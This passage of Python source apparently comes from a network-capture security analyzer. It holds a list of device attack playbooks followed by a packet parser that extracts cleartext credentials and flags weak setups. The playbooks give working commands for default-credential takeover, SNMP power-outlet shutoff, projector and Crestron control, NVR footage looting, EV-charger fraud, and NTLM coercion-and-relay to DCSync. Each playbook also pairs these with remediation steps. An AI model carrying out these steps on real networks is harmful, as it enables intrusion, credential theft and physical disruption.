            "Web: `curl -s http://<apc>/logon.htm` → POST credentials. Try `apc/apc`, "
            "`device/device`, `admin/admin`. Older firmware exposes serial console "
            "via the same web UI.",
            "SNMP: `snmpwalk -v2c -c public <apc> 1.3.6.1.4.1.318.1.1.4` lists outlets; "
            "`snmpset -v2c -c private <apc> 1.3.6.1.4.1.318.1.1.4.4.2.1.3.<outlet> i 2` "
            "outlet-off (PowerNet-MIB).",
            "Schedule: web admin lets you set a daily reboot — long-game persistence.",
            "Defender side: rotate `apc/apc`; SNMPv3 authPriv only; restrict web admin "
            "to mgmt VLAN; firmware ≥ AOS 7.0.",
        ],
        "tools": ["curl", "snmpwalk / snmpset", "Hydra (web brute APC)",
                  "Metasploit auxiliary/scanner/snmp/snmp_set"],
    },
    {
        "id": "pjlink-projector-takeover",
        "name": "PJLink projector — empty-password takeover + meeting hijack",
        "severity": "medium",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["PJLink"],
        "description": ("PJLink on tcp/4352 controls every JBMIA-conformant projector "
                        "(Epson, NEC, Panasonic, Sony, ViewSonic). Default password is "
                        "empty on Class-1 or 'default' on Class-2 — power, source, mute, "
                        "freeze, channel."),
        "steps": [
            "Probe: `nc <host> 4352` → device responds `PJLINK 0` (no auth) or "
            "`PJLINK 1 <8hex>` (challenge for MD5(pass + challenge)).",
            "If challenge: try MD5(empty + challenge) (firmware default) or "
            "MD5('JBMIAProjectorLink' + challenge) on some makes.",
            "Commands: `POWR 1` (on), `POWR 0` (off), `INPT 11` (source switch), "
            "`AVMT 31` (blank screen). All effective during a live meeting.",
            "Defender side: rotate PJLink password; restrict tcp/4352 to AV-control "
            "VLAN.",
        ],
        "tools": ["nc / pjlink CLI", "Python pypjlink", "OBS PJLink plugin"],
    },
    {
        "id": "wireless-presentation-pwn",
        "name": "Wireless presentation (ClickShare/Solstice/AirMedia) — admin + Wi-Fi pivot",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["presentation"],
        "description": ("Wireless-presentation appliances bridge wired LAN to wireless "
                        "client devices. Admin UIs default to vendor creds and "
                        "frequently store the corporate Wi-Fi PSK in plain (CVE-2019-18827 "
                        "Barco, ClickShare auth bypass)."),
        "steps": [
            "Fingerprint: `curl -s http://<host>/` → vendor (Barco/Mersive/Crestron "
            "stamp in HTML title). For Barco: `/cgi-bin/quick_setup.cgi`.",
            "Defaults: ClickShare `admin/admin`, Solstice `admin/<serial-last-4>`, "
            "AirMedia `admin/admin`.",
            "Once in: read out corporate Wi-Fi PSK (often stored under "
            "Network → Enterprise SSID), guest SSID PSK, and any AD bind credentials "
            "for calendar integration.",
            "ClickShare unauth CVE-2019-18827: GET `/api/v1.5/Configuration/` dumps "
            "the entire config on unpatched firmware.",
            "Defender side: rotate default; patch firmware; don't let the device "
            "join the corporate Wi-Fi profile — give it wired-only.",
        ],
        "tools": ["curl", "Hydra (web brute)", "Burp Suite",
                  "Barco/Solstice CVE PoCs"],
    },
    {
        "id": "crestron-control-takeover",
        "name": "Crestron / AMX — default Toolbox port → full room automation",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["Crestron"],
        "description": ("Crestron control processors expose Toolbox (41794) and CIP "
                        "(41795). A surprising number leave them open with no admin "
                        "password (default behavior on older firmware). With Toolbox "
                        "access you reflash the program — total control of every "
                        "actuator the processor drives (HVAC, AV, shades, door locks)."),
        "steps": [
            "Probe: `nc <host> 41794` → blank prompt = no auth required. Try "
            "`hostname` then `ver`.",
            "Pull the program: Toolbox commands `progcomments`, `progsize` reveal the "
            "loaded SIMPL Windows / Lua program. Download with the Crestron Toolbox "
            "GUI from your PC.",
            "Reflash: load a modified `.smw` (signal control logic) to redirect "
            "actions. Trivial mischief (room-blackout on demand); serious risk if "
            "the room is OT-adjacent (data center cooling).",
            "Defender side: set MODE=`Restricted`, set admin password, disable Toolbox "
            "TCP port if not in use, segregate AV control to its own VLAN.",
        ],
        "tools": ["nc", "Crestron Toolbox (vendor GUI)",
                  "official `simpl-windows` ↔ wire telnet"],
    },
    {
        "id": "dlna-traversal",
        "name": "DLNA / UPnP MediaServer — content browse + miniDLNA traversal",
        "severity": "medium",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["DLNA", "MediaServer"],
        "description": ("UPnP MediaServers (miniDLNA, Plex DLNA fallback, NAS-built-in) "
                        "expose content with no auth on LAN — interesting both as a "
                        "content-exfil channel and (older miniDLNA, CVE-2020-12695) "
                        "as a path-traversal RCE vector."),
        "steps": [
            "Discover: SSDP M-SEARCH `urn:schemas-upnp-org:device:MediaServer:1` → "
            "LOCATION → description XML.",
            "Browse content: `curl -X POST -H 'SOAPAction: \"urn:schemas-upnp-org:"
            "service:ContentDirectory:1#Browse\"' -d <browse.xml> http://<host>:8200/"
            "ctl/ContentDir`.",
            "miniDLNA <1.1.5: CallStranger CVE-2020-12695 — UPnP SUBSCRIBE callback "
            "reflects arbitrary URLs as the server (SSRF + amplifier). Some "
            "implementations leaked /etc/passwd via `Range: bytes=` on file URLs.",
            "Defender side: upgrade miniDLNA; bind to LAN-only IFs; share only "
            "media-only directories.",
        ],
        "tools": ["upnpc", "Wireshark UPnP dissector", "miniDLNA PoCs"],
    },
    {
        "id": "iot-hub-pillage",
        "name": "Smart-home hub — token theft → every IoT device on LAN",
        "severity": "critical",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["Smart-home hub"],
        "description": ("Smart-home hubs (SmartThings, Hubitat, Wink, Vera, Home Assistant) "
                        "store API tokens and cloud-account creds for every paired device. "
                        "Compromise the hub = compromise the entire IoT footprint, often "
                        "including locks, garage doors, and presence sensors."),
        "steps": [
            "Fingerprint: `curl http://<hub>:8123/api/` (Home Assistant), "
            "`http://<hub>:39500/elevate/` (Hubitat). Most hubs default to no auth "
            "on the LAN-side API for initial setup.",
            "If Home Assistant: `/api/states` and `/api/services` give full read + "
            "control. CVE-2022-3859 supervisor auth bypass (patched) gave LAN RCE.",
            "If Hubitat / SmartThings: scrape `/api/devices` and pull the master "
            "Z-Wave / Zigbee join keys → join-as-controller for new devices.",
            "Token loot: hubs commonly store IFTTT / Alexa / Google Home OAuth tokens "
            "in their local DB — those tokens grant cloud-side access too.",
            "Defender side: enable hub login (turn off `localOnly` exemptions); "
            "isolate IoT VLAN; patch firmware promptly.",
        ],
        "tools": ["curl + jq", "Home-Assistant CLI",
                  "metasploit aux/scanner/home_assistant_*"],
    },
    {
        "id": "ev-charger-ocpp-fraud",
        "name": "EV charger (OCPP) — remote start/stop + meter spoof",
        "severity": "high",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["EV charger", "OCPP"],
        "description": ("Many EV chargers (ChargePoint, Wallbox, Easee, generic OCPP) "
                        "speak OCPP-J 1.6 / 2.0 over a WebSocket on tcp/9000 with no "
                        "TLS or auth. With a fake CSMS you steer transactions or "
                        "convince the charger it's free."),
        "steps": [
            "Identify the OCPP CSMS URL the charger normally connects to "
            "(`ws://<server>:9000/ocpp/<charger-id>`).",
            "Stand up a rogue CSMS: `python -m ocpp` example server. Redirect via "
            "rogue DHCP + DNS, or by editing the charger's config UI.",
            "Send `RemoteStartTransaction` to start a session for any RFID UID; "
            "send `MeterValues` with zero energy → free charging fraud.",
            "Sniff transactions: WebSocket frames are plaintext JSON — pull RFID UIDs "
            "+ transaction history from the on-segment capture.",
            "Defender side: require OCPP-J over TLS (wss://); enforce mutual auth; "
            "cryptographically signed firmware updates.",
        ],
        "tools": ["Python `ocpp` library", "websocat", "Wireshark WebSocket dissector",
                  "Metasploit auxiliary/admin/scada/ev_charger_*"],
    },
    {
        "id": "solar-inverter-takeover",
        "name": "Solar inverter — installer PIN + Speedwire control",
        "severity": "medium",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["Solar", "inverter"],
        "description": ("SMA SunnyBoy, Fronius Symo, and Enphase Envoy ship with web UIs "
                        "that accept a static installer PIN (often a function of the "
                        "serial number). Attackers in the same LAN can change export "
                        "limits, modify grid feed, or disable the inverter entirely."),
        "steps": [
            "SMA: web UI on tcp/80, login `installer/<sma-installer-pin>` — published "
            "in installer manuals; some old firmware has hardcoded `0000`.",
            "Fronius: Solar.web app + local Datamanager card. CVE-2019-19229 "
            "unauth setup endpoint allows config changes.",
            "Enphase Envoy: `installer:<envoy-installer-pin>` via `/installer` URL. "
            "CVE-2022-29349 default-creds class.",
            "Operational impact: change feed-in tariff settings → underpaid revenue; "
            "disable inverter at peak generation → wasted output. Coordinated, this "
            "becomes a grid-stability concern.",
            "Defender side: rotate installer PIN; air-gap the inverter management to "
            "a dedicated VLAN; restrict cloud-bridge to vendor IPs.",
        ],
        "tools": ["curl + Burp", "vendor manuals",
                  "metasploit aux/scanner/scada/{sma,fronius,enphase}_*"],
    },
    {
        "id": "console-upnp-leak",
        "name": "Game console — UPnP IGD punch-out → unintended WAN exposure",
        "severity": "low",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["console"],
        "description": ("Consoles aggressively punch WAN port-forwards via UPnP IGD "
                        "during gameplay and voice chat. If the gateway honors UPnP, "
                        "the console's services (chat servers, content sharing) "
                        "become reachable from the internet."),
        "steps": [
            "Audit existing mappings on the gateway: `upnpc -l`. Anything with "
            "`internal: <console-ip>` is what the console asked for.",
            "Mappings often include 3074/UDP (Xbox Live), 3478-3480/UDP "
            "(PSN STUN), 9293 (PS5 share). All are user-facing services with "
            "their own protocol surfaces.",
            "Demonstrate: outside the gateway, connect to the mapped WAN port → "
            "reaches the console's server.",
            "Defender side: disable UPnP on the gateway; rely on manual port-forwards "
            "only.",
        ],
        "tools": ["upnpc (miniupnpc)", "nmap external scan of the WAN IP"],
    },
    {
        "id": "nvr-mass-camera-takeover",
        "name": "Surveillance NVR/DVR — central video archive + cred pivot",
        "severity": "critical",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["NVR", "DVR"],
        "description": ("NVR/DVR appliances aggregate every camera's archive plus "
                        "the credentials needed to manage them. Same CVE families as "
                        "the cameras themselves, with the added prize of a Linux "
                        "shell on the management port that controls retention + export."),
        "steps": [
            "Hikvision/Dahua NVR: same auth-bypass family as the cameras "
            "(CVE-2017-7921 / CVE-2021-33044). Try `http://<nvr>/Security/users` first.",
            "Default creds: Hikvision `admin/12345`, Dahua `admin/admin` or "
            "`888888/888888`, NUUO `admin/admin`.",
            "If shelled: pull `cameras.json` / equivalent — contains every camera's "
            "RTSP credential, frequently the same admin password reused.",
            "Loot archive: NVRs commonly mount large disks at `/mnt/sda1/` with "
            "`.mp4` recordings — exfil whatever's interesting before retention "
            "rolls over.",
            "Defender side: patch NVR firmware; force per-camera unique passwords; "
            "isolate cameras + NVR to a no-egress VLAN.",
        ],
        "tools": ["curl + Burp", "metasploit hikvision/dahua modules",
                  "ffmpeg (RTSP probe)", "NVR vendor CLI"],
    },
    {
        "id": "rtsp-stream-scrape",
        "name": "RTSP — anonymous stream scrape (mass camera/baby-monitor exposure)",
        "severity": "medium",
        "phase": "device",
        "match_any_category": ["device-exposure"],
        "match_substring": ["RTSP"],
        "description": ("RTSP on tcp/554 often serves video without auth (or under a 2-char "
                        "default basic-auth). Generic at the LAN level, mass-scaled at "
                        "the internet level (Insecam-class)."),
        "steps": [
            "Probe paths: `ffprobe rtsp://<ip>/`. If 401, try `rtsp://admin:admin@<ip>/` "
            "and the per-vendor defaults from `ipcam-default-rtsp`.",
            "Path discovery: `cameradar -t <ip>` brute-forces ~120 known per-vendor paths "
            "(Axis `/axis-media/media.amp`, Hikvision `/Streaming/Channels/1`, "
            "Foscam `/videoMain`, Generic `/h264.sdp`).",
            "Once a stream is open: `ffmpeg -i rtsp://<ip>/<path> -t 10 sample.mp4` for "
            "proof; live viewing in VLC.",
            "Defender side: require auth on every RTSP path; rotate from defaults; "
            "consider RTSPS (TLS-wrapped) on modern firmware.",
        ],
        "tools": ["Cameradar", "ffmpeg / ffprobe", "VLC", "Wireshark RTP dissector"],
    },
    {
        "id": "coerce-relay-chain",
        "name": "Auth coercion → NTLM relay — PrinterBug / PetitPotam / DFSCoerce",
        "severity": "critical",
        "phase": "AD lateral",
        "match_any_category": ["spoofable-resolution", "ntlm-capture", "smb"],
        "description": ("Authentication coercion bugs in MS-RPRN (PrinterBug / SpoolSample), "
                        "MS-EFSRPC (PetitPotam), MS-DFSNM (DFSCoerce), MS-FSRVP (ShadowCoerce) "
                        "force any computer (including DCs) to NTLM-auth to an attacker-"
                        "controlled UNC. Pair with ntlmrelayx → SMB / LDAP / AD CS targets."),
        "steps": [
            "Spin up the relay first: `impacket-ntlmrelayx -t <smb-target-no-signing> "
            "-smb2support -socks` (or `-t ldap://<dc> --escalate-user <you>` to grant "
            "DCSync rights, or `-t http://<adcs>/certsrv --adcs` for ESC8).",
            "Coerce — pick whichever path the patches haven't closed: "
            "`python3 PetitPotam.py -u '' -p '' <attacker> <victim>` (anon EFSRPC) / "
            "`SpoolSample.exe \\\\<victim> \\\\<attacker>` / "
            "`python3 dfscoerce.py -u <user> -p <pass> <attacker> <victim>` / "
            "`ShadowCoerce.py`.",
            "ntlmrelayx receives the auth and runs whichever target action you wired. "
            "Common outcomes: --escalate-user grants DCSync; --adcs yields a cert in "
            "the victim's name; -c '<cmd>' fires the command as SYSTEM on the SMB target.",
            "Pivot via DCSync (`secretsdump -just-dc`) or via the AD CS cert "
            "(`certipy auth`).",
            "Defender side: patch (KB5005413 EFSRPC, KB5007090 DFSNM, etc.); enforce "
            "SMB signing everywhere; channel-binding + RequireSSL on AD CS web.",
        ],
        "tools": ["impacket ntlmrelayx", "PetitPotam", "SpoolSample / Coercer",
                  "dfscoerce", "ShadowCoerce", "Certipy"],
    },
]


def classify_port(port):
    """Return (service_name, is_plaintext) for a given port."""
    if port in PLAINTEXT_PORTS:
        return PLAINTEXT_PORTS[port], True
    if port in ENCRYPTED_PORTS:
        return ENCRYPTED_PORTS[port], False
    if port in COMMON_PORTS:
        svc = COMMON_PORTS[port]
        plaintext = svc in ("SMB", "NETBIOS-SSN", "NETBIOS-DGM", "NETBIOS-NS", "LLMNR", "MDNS")
        return svc, plaintext
    return None, False


def is_private(ip_str):
    try:
        return ipaddress.ip_address(ip_str).is_private
    except ValueError:
        return False


def is_multicast_or_broadcast(ip_str):
    try:
        ip = ipaddress.ip_address(ip_str)
        return ip.is_multicast or ip_str.endswith(".255") or ip_str == "255.255.255.255"
    except ValueError:
        return False


def _entropy(s):
    if not s:
        return 0.0
    counts = Counter(s)
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


class PcapAnalysis:
    def __init__(self, pcap_path=None, source_label=None):
        self.pcap_path = pcap_path
        self.source_label = source_label or (os.path.basename(pcap_path) if pcap_path else "live")
        self.lock = threading.RLock()
        self.hosts = {}
        self.flows = {}
        self.total_packets = 0
        self.parse_errors = 0
        self.start_time = None
        self.end_time = None
        self.plaintext_samples = defaultdict(list)
        self.dns_queries = []
        self.credentials = []
        self._cred_seen = set()
        self.sni_observations = []
        self._sni_seen = set()

        self.findings = []
        self._finding_seen = set()

        self.arp_table = defaultdict(set)
        self._dhcp_by_mac = {}  # MAC -> {hostname, vendor_class} for 0.0.0.0-sourced DISCOVERs
        # Background WHOIS prefetcher — every new public IP triggers an RDAP lookup
        # in this small pool so labels light up without blocking parse.
        self._whois_pool = ThreadPoolExecutor(max_workers=4, thread_name_prefix="whois")
        self._whois_inflight = set()
        self._whois_inflight_lock = threading.Lock()
        self.scan_pairs = defaultdict(set)
        self.scan_dport_by_dst = defaultdict(lambda: defaultdict(set))
        self.icmp_targets = defaultdict(set)
        self.flow_ts = defaultdict(list)
        self.ntlm_messages = []
        self.smb1_flows = set()
        self.weak_tls_flows = set()

        self.packets = {}
        self.flow_packets = defaultdict(list)
        self._packet_counter = 0
        self.PACKET_CAP = 200000

        # HTTP transaction log — req/resp pairs across all hosts, for the global feed.
        self.http_txns = []
        self._http_pending = {}     # (client_ip, client_port, server_ip, server_port) -> pending request
        self.HTTP_TXN_CAP = 2000
        self.HTTP_PAYLOAD_CAP = 4096
        self.PER_FLOW_CAP = 2000
        self.PAYLOAD_CAP = 2048

    def _get_host(self, ip):
        if ip not in self.hosts:
            self.hosts[ip] = {
                "ip": ip,
                "packets_in": 0,
                "packets_out": 0,
                "bytes_in": 0,
                "bytes_out": 0,
                "peers": set(),
                "ports_listening": set(),
                "ports_connecting": set(),
                "protocols": set(),
                "plaintext_services": set(),
                "encrypted_services": set(),
                "dns_names": set(),
                "mac": None,
                "is_private": is_private(ip),
                "is_multicast": is_multicast_or_broadcast(ip),
                "finding_keys": set(),
                "risk_score": 0,
                # identity
                "vendor": None,
                "device_type": None,
                "hostname": None,
                "dhcp_hostname": None,
                "dhcp_vendor_class": None,
                "nbns_name": None,
                "mdns_local_name": None,
                "ssdp_server": None,
                "ssdp_friendly_name": None,
                "rdns_name": None,
                # WHOIS / RDAP (filled in by background prefetcher)
                "whois_org": None,
                "whois_country": None,
                "whois_asn": None,
                # Threat-intel — set of reputation-feed tags this IP appears on.
                "reputation_tags": [],
                "malicious": False,
            }
            # Fire-and-forget RDAP lookup for new public hosts.
            self._maybe_whois(ip)
            # Quick reputation check (returns immediately if feeds aren't loaded yet —
            # _finalize() does a second pass to cover the early-host case).
            self._check_reputation(ip)
        return self.hosts[ip]

    def _check_reputation(self, ip):
        """Look an IP up in the loaded reputation feeds and populate host fields."""
        if is_private(ip) or is_multicast_or_broadcast(ip):
            return
        try:
            tags = reputation_feeds.lookup(ip)
        except Exception:
            return
        if not tags:
            return
        h = self.hosts.get(ip)
        if not h:
            return
        h["reputation_tags"] = tags
        h["malicious"] = reputation_feeds.is_malicious(tags)

    _HTTP_METHODS = ("GET ", "POST ", "PUT ", "DELETE ", "HEAD ", "OPTIONS ",
                     "PATCH ", "CONNECT ", "TRACE ", "PROPFIND ", "PROPPATCH ",
                     "MKCOL ", "MOVE ", "COPY ", "LOCK ", "UNLOCK ", "SUBSCRIBE ",
                     "UNSUBSCRIBE ", "NOTIFY ", "M-SEARCH ")

    def _d_http_transaction(self, ts, src, dst, sport, dport, http_text):
        """Record an HTTP request/response pair into the global feed.

        Pairing key uses the client side as origin: (client_ip, client_port, server_ip, server_port).
        Requests originate from the client; responses come back with src/sport swapped.
        Truncated to HTTP_PAYLOAD_CAP characters per direction.
        """
        if not http_text:
            return
        text = http_text[:self.HTTP_PAYLOAD_CAP]
        # Request side: payload begins with a method token.
        if any(text.startswith(m) for m in self._HTTP_METHODS):
            key = (src, sport, dst, dport)   # client→server perspective
            # Don't overflow pending dict on long-lived hosts; cap it.
            if len(self._http_pending) > 4000:
                self._http_pending.pop(next(iter(self._http_pending)), None)
            self._http_pending[key] = {
                "ts": ts, "client": src, "client_port": sport,
                "server": dst, "server_port": dport, "request": text,
            }
            return
        # Response side: starts with "HTTP/" — flip the key to find the pending request.
        if text.startswith("HTTP/"):
            key = (dst, dport, src, sport)   # client (was dst here) → server (was src here)
            pending = self._http_pending.pop(key, None)
            txn = {
                "ts": ts,
                "client": (pending or {}).get("client") or dst,
                "client_port": (pending or {}).get("client_port") or dport,
                "server": (pending or {}).get("server") or src,
                "server_port": (pending or {}).get("server_port") or sport,
                "request_ts": (pending or {}).get("ts"),
                "request": (pending or {}).get("request"),
                "response_ts": ts,
                "response": text,
            }
            if len(self.http_txns) < self.HTTP_TXN_CAP:
                self.http_txns.append(txn)
            else:
                # Drop the oldest so live captures don't grow unbounded.
                self.http_txns.pop(0)
                self.http_txns.append(txn)

    def _maybe_whois(self, ip):
        """Enqueue a background RDAP lookup for a freshly-seen public IP."""
        if not HAS_IPWHOIS:
            return
        if is_private(ip) or is_multicast_or_broadcast(ip):
            return
        if ip in ("0.0.0.0", "255.255.255.255", "::"):
            return
        with self._whois_inflight_lock:
            if ip in self._whois_inflight:
                return
            self._whois_inflight.add(ip)
        try:
            self._whois_pool.submit(self._do_whois, ip)
        except Exception:
            # Pool shut down — silently drop.
            with self._whois_inflight_lock:
                self._whois_inflight.discard(ip)

    def _do_whois(self, ip):
        """Worker: do the RDAP lookup, then write org/country/asn back onto the host."""
        try:
            result = whois_cache.lookup(ip)
        except Exception:
            return
        if not result or result.get("error") or result.get("private"):
            return
        org = result.get("asn_description") or result.get("network_name") or None
        # Trim the AS-prefix some RIRs include ("AS15169 GOOGLE, US") down to just the org name.
        if org:
            org = re.sub(r"^AS\d+\s+", "", org).strip()
            # If trailing ", CC" exists and matches the country, peel it off so we don't double up.
            cc = (result.get("asn_country") or result.get("network_country") or "").upper()
            if cc and org.upper().endswith(", " + cc):
                org = org[:-(len(cc) + 2)].rstrip()
        country = (result.get("asn_country") or result.get("network_country") or None)
        rdns = result.get("rdns")
        with self.lock:
            h = self.hosts.get(ip)
            if not h:
                return
            if org and not h.get("whois_org"):
                h["whois_org"] = org[:80]
            if country and not h.get("whois_country"):
                h["whois_country"] = country[:4].upper()
            if result.get("asn") and not h.get("whois_asn"):
                h["whois_asn"] = result["asn"]
            if rdns and not h.get("rdns_name"):
                h["rdns_name"] = rdns
            # Refresh the picked hostname now that rDNS may have arrived.
            if rdns and not h.get("hostname"):
                h["hostname"] = pick_hostname(h)

    def _get_flow(self, src, dst):
        key = (src, dst)
        if key not in self.flows:
            self.flows[key] = {
                "src": src,
                "dst": dst,
                "packets": 0,
                "bytes": 0,
                "protocols": set(),
                "services": set(),
                "plaintext": False,
                "ports": set(),
            }
        return self.flows[key]

    def parse(self, progress_cb=None):
        if not self.pcap_path:
            return
        try:
            with PcapReader(self.pcap_path) as pcap:
                for pkt in pcap:
                    try:
                        self._process_packet(pkt)
                        with self.lock:
                            self.total_packets += 1
                    except Exception:
                        with self.lock:
                            self.parse_errors += 1
                    if progress_cb and self.total_packets % 5000 == 0:
                        progress_cb(self.total_packets)
        except Exception as e:
            print(f"[!] PCAP read error: {e}", file=sys.stderr)
        if progress_cb:
            progress_cb(self.total_packets)
        self._finalize()

    def ingest_live_packet(self, pkt):
        try:
            self._process_packet(pkt)
            with self.lock:
                self.total_packets += 1
        except Exception:
            with self.lock:
                self.parse_errors += 1

    def _add_finding(self, severity, category, title, description,
                     hosts=(), port=None, evidence=None, key=None,
                     remediation=None):
        k = key or (severity, category, title, tuple(sorted(hosts)), port)
        if k in self._finding_seen:
            return
        self._finding_seen.add(k)
        fid = len(self.findings)
        entry = {
            "id": fid,
            "severity": severity,
            "category": category,
            "title": title,
            "description": description,
            "hosts": list(hosts),
            "port": port,
            "evidence": evidence,
            "remediation": remediation,
        }
        self.findings.append(entry)
        w = SEVERITY_WEIGHT.get(severity, 0)
        for ip in hosts:
            try:
                h = self._get_host(ip)
                h["finding_keys"].add(fid)
                h["risk_score"] += w
            except Exception:
                pass

    def _store_packet(self, ts, src, dst, proto, size,
                      sport=None, dport=None, flags=None,
                      payload=b"", service=None, extras=None):
        if len(self.packets) >= self.PACKET_CAP:
            return None
        flow_key = (src, dst)
        if len(self.flow_packets[flow_key]) >= self.PER_FLOW_CAP:
            return None
        pid = self._packet_counter
        self._packet_counter += 1
        self.packets[pid] = {
            "id": pid,
            "ts": ts,
            "src": src, "dst": dst,
            "sport": sport, "dport": dport,
            "proto": proto,
            "size": size,
            "flags": flags,
            "service": service,
            "extras": extras or {},
            "payload_len": len(payload) if payload else 0,
            "payload": bytes(payload[:self.PAYLOAD_CAP]) if payload else b"",
        }
        self.flow_packets[flow_key].append(pid)
        return pid

    def _add_credential(self, src, dst, port, kind, username=None, password=None, extra=None):
        key = (src, dst, port, kind, username or "", password or "", extra or "")
        if key in self._cred_seen:
            return
        self._cred_seen.add(key)
        self.credentials.append({
            "src": src, "dst": dst, "port": port, "kind": kind,
            "username": username, "password": password, "extra": extra,
        })
        if username is not None and password is not None:
            if (username.lower(), password) in DEFAULT_CREDENTIALS or \
               (username, password) in DEFAULT_CREDENTIALS:
                self._add_finding("critical", "default-creds",
                    f"Default credentials in use: {username}:{password or '<empty>'} ({kind})",
                    f"Observed {kind} login {src} → {dst}:{port} with default/common credential pair. "
                    f"This is among the first pairs any attacker tries.",
                    hosts=[src, dst], port=port,
                    evidence=f"{username}:{password}",
                    remediation="Rotate immediately; disable default accounts where possible; enforce password policy.",
                    key=("default-creds", dst, username, password))

    def _add_sni(self, src, dst, port, sni):
        key = (src, sni)
        if key in self._sni_seen:
            return
        self._sni_seen.add(key)
        self.sni_observations.append({"src": src, "dst": dst, "port": port, "sni": sni})
        try:
            h = self._get_host(src)
            h.setdefault("sni_names", set()).add(sni)
        except Exception:
            pass
        self._d_cloud_host(src, dst, port, sni)

    def _extract_creds(self, src, dst, sport, dport, payload):
        if not payload:
            return
        try:
            text = payload.decode("utf-8", errors="replace")
        except Exception:
            text = ""

        if dport == 21 or sport == 21:
            for line in text.splitlines():
                ls = line.strip()
                up = ls.upper()
                if up.startswith("USER "):
                    user = ls[5:].strip()
                    self._add_credential(src, dst, 21, "FTP", username=user)
                    if user.lower() in ("anonymous", "ftp", ""):
                        self._add_finding("medium", "weak-auth",
                            "FTP anonymous login attempted",
                            f"Host {src} attempted FTP anonymous login to {dst}:21.",
                            hosts=[src, dst], port=21, evidence=f"USER {user}",
                            remediation="Disable anonymous FTP or migrate to SFTP/FTPS.",
                            key=("ftp-anon", src, dst))
                elif up.startswith("PASS "):
                    self._add_credential(src, dst, 21, "FTP", password=ls[5:].strip())

        if dport == 23:
            self._add_finding("high", "plaintext-protocol",
                "Telnet traffic observed",
                f"Telnet session {src} → {dst}:23. All commands, banners, and credentials travel in cleartext.",
                hosts=[src, dst], port=23,
                remediation="Replace Telnet with SSH immediately.",
                key=("telnet", src, dst))
            clean = bytes(b for b in payload if b < 0x80 and (b >= 0x20 or b in (0x0a, 0x0d)))
            try:
                s = clean.decode("ascii", errors="replace").strip()
            except Exception:
                s = ""
            if s and len(s) < 200:
                self._add_credential(src, dst, 23, "TELNET", extra=s[:120])

        if dport in (80, 8080, 8000) or sport in (80, 8080, 8000):
            port = dport if dport in (80, 8080, 8000) else sport
            for m in re.finditer(r"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", text, re.IGNORECASE):
                b64 = m.group(1)
                try:
                    decoded = base64.b64decode(b64, validate=False).decode("utf-8", errors="replace")
                    if ":" in decoded:
                        u, p = decoded.split(":", 1)
                        self._add_credential(src, dst, port, "HTTP-BasicAuth", username=u, password=p)
                        self._add_finding("critical", "cleartext-creds",
                            f"HTTP Basic Auth cleartext ({u})",
                            f"Plaintext HTTP Basic Auth recovered from {src} → {dst}:{port}.",
                            hosts=[src, dst], port=port, evidence=f"{u}:{p}",
                            remediation="Serve over HTTPS; switch to token/OIDC auth.",
                            key=("basic-auth", u, dst))
                except Exception:
                    pass
            for m in re.finditer(r"Authorization:\s*Bearer\s+([A-Za-z0-9._\-]+)", text, re.IGNORECASE):
                tok = m.group(1)[:160]
                self._add_credential(src, dst, port, "HTTP-Bearer", extra=tok)
                self._add_finding("high", "cleartext-creds",
                    "HTTP bearer token over cleartext",
                    f"Bearer token exposed {src} → {dst}:{port}.",
                    hosts=[src, dst], port=port, evidence=tok[:80],
                    remediation="Force HTTPS for any API that accepts bearer tokens.",
                    key=("bearer", src, dst, port))
            for m in re.finditer(r"Cookie:\s*([^\r\n]+)", text, re.IGNORECASE):
                self._add_credential(src, dst, port, "HTTP-Cookie", extra=m.group(1)[:160])
            if text.startswith("POST ") and re.search(r"(?:^|&)(?:password|passwd|pwd|pass)=", text, re.IGNORECASE):
                self._add_finding("critical", "cleartext-creds",
                    "HTTP POST with password field (no TLS)",
                    f"Cleartext password POST {src} → {dst}:{port}.",
                    hosts=[src, dst], port=port,
                    evidence=text[:240].replace("\r", "\\r").replace("\n", "\\n"),
                    remediation="Require HTTPS; redirect HTTP → HTTPS.",
                    key=("http-login", src, dst, port))

        if dport in (110, 143):
            for line in text.splitlines():
                ls = line.strip()
                up = ls.upper()
                proto = "POP3" if dport == 110 else "IMAP"
                if up.startswith("USER "):
                    self._add_credential(src, dst, dport, proto, username=ls[5:].strip())
                elif up.startswith("PASS "):
                    self._add_credential(src, dst, dport, proto, password=ls[5:].strip())
                elif "LOGIN " in up:
                    parts = ls.split()
                    idx = next((i for i, p in enumerate(parts) if p.upper() == "LOGIN"), -1)
                    if idx >= 0 and len(parts) >= idx + 3:
                        self._add_credential(src, dst, dport, proto,
                                             username=parts[idx+1], password=parts[idx+2])

        if dport == 161 or sport == 161:
            m = re.search(rb"\x04([\x20-\x7e]{3,32})", payload[:40])
            if m:
                community = m.group(1).decode("ascii", errors="replace")
                if community.isprintable() and not community.startswith(("\x30", "\xa0")):
                    self._add_credential(src, dst, 161, "SNMP-Community", extra=community)
                    sev = "critical" if community.lower() in ("public", "private", "cisco", "admin") else "high"
                    self._add_finding(sev, "weak-auth",
                        f"SNMP v1/v2c community '{community}'",
                        f"Plaintext SNMP community captured. Enumerate with "
                        f"`snmpwalk -c {community} -v 2c {dst}` — often leaks interfaces, ARP table, config.",
                        hosts=[src, dst], port=161, evidence=community,
                        remediation="Move to SNMPv3 with authPriv; never leave default communities.",
                        key=("snmp-comm", dst, community))

        if dport == 25 or sport == 25 or dport == 587:
            for line in text.splitlines():
                up = line.strip().upper()
                if up.startswith("VRFY ") or up.startswith("EXPN "):
                    cmd = up.split(None, 1)[0]
                    self._add_finding("low", "recon",
                        f"SMTP {cmd} user enumeration",
                        f"{src} → {dst}:{dport} issued '{line.strip()}' — SMTP user enumeration.",
                        hosts=[src, dst], port=dport, evidence=line.strip()[:120],
                        remediation="Disable VRFY and EXPN on the MTA.",
                        key=("smtp-vrfy", src, dst))
